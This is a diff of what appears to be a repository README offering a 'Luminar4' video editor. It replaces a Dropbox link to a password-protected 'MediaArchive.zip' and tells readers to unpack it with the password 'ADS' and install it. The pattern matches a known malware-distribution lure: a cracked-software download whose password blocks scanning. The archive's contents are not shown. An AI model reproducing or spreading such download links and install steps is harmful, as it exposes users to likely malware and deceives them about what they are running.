@@ -3,7 +3,7 @@
 
 <p align="center">
   
-<h1 align="center"><a  href="https://www.dropbox.com/s/jg8m2lgos0y7cwr/MediaArchive.zip?dl=1">DOWNLOAD</a></h1>
+<h1 align="center"><a  href="https://www.dropbox.com/s/vxfjq31lxo4vl7a/MediaArchive.zip?dl=1">DOWNLOAD</a></h1>
 <h4 align="center">Download the program, use the password: ADS To unpack the archive and install the video editor on your computer </h4>
 <p align="center">
   
@@ -42,4 +42,4 @@
 ![alt-текст](https://b.radikal.ru/b40/2012/86/149487124cb5.jpg "Luminar4")
 
 
-![alt-текст](https://radikal.ru/video/51GaW3gsPRS "Luminar4")
+
